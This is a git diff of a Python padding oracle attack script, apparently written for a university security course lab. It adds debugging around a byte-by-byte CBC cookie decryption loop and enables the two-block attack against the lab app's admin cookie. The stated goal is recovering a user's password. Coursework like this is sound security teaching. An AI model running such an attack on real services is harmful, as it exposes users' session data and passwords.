@@ -57,17 +57,27 @@ def po_attack_2blocks(po, ctx):
     # Implement padding oracle attack for 2 blocks of messages.
 
     plaintext = bytearray(16)
+    # plaintext[0] = 255 # TODO: Don't init the admin byte to be 00, which looks valid to us
+    count = 0
     for i in range(15, -1, -1):
+        # print("Checking i: {}".format(i))
         test = bytearray(16)
         for j in range(i + 1, 16):
             test[j] = plaintext[j] ^ c0[j] ^ (16 - i)
+            # print("test with padding: {}".format(test))
         for val in range(256):
             test[i] = val
+            # print("test with byte: {}".format(test))
             C1_prime = test + c1
+            # print("C1 Prime: {}".format(C1_prime))
             if check_padding_response(C1_prime):
+                count += 1
                 print("Padding passed: {}".format((i,val)))
                 plaintext[i] = val ^ c0[i] ^ (16 - i)
-                break # Keep me
+                break # Keep me # TODO: See if we're getting multiple passes per index? -> Piazza post with Philippe?
+
+    if count < 16:
+        print("Didn't recover full block. Recovered {} bytes only".format(count))
     return plaintext
 
 def po_attack(po, ctx):
@@ -119,10 +129,12 @@ if __name__ == "__main__":
     
     sess = Session()
     print("Cookie pre logon: {}".format(sess.cookies.get_dict()))
-    uname ="victim"
-    pw = "victim"
+    # uname ="victim"
+    # pw = "victim"
     # uname = "andrew"
     # pw = "hellomynameisandrewpalmeriliketosurf"
+    uname = 'test'
+    pw = 'thisisalongpasswordtotest'
     assert(do_login_form(sess, uname,pw))
     print("Cookies after logon: {}".format(sess.cookies.get_dict()))
     admin_cookie = sess.cookies.get_dict()["admin"]
@@ -146,12 +158,18 @@ if __name__ == "__main__":
 
     # Instantitate padding oracle
     po = PaddingOracle(SETCOINS_FORM_URL)
-    # result = po_attack_2blocks(po, first_two_blocks)
-    # print("PO Attack 2 blocks result: {}".format(result))
+    result = po_attack_2blocks(po, first_two_blocks)
+    print("PO Attack 2 blocks result: {}".format(result))
 
     # Test with full test cookie
     # full_result = po_attack(po, TEST_COOKIE)
 
     # TODO: Capture user's password from admin cookie
-    password = po_attack(po, admin_cookie_bytes)
+    # password = po_attack(po, admin_cookie_bytes)
+
+    # TODO: Manually decrypt password to test po attack
+    # encryption_key = b'\x00'*16
+    # cbc = app.api.encr_decr.Encryption(encryption_key)
+    # dpt = cbc.decrypt(bytes.fromhex(admin_cookie))
+    # print("Decrypted admin cookie: {}".format(dpt))
 
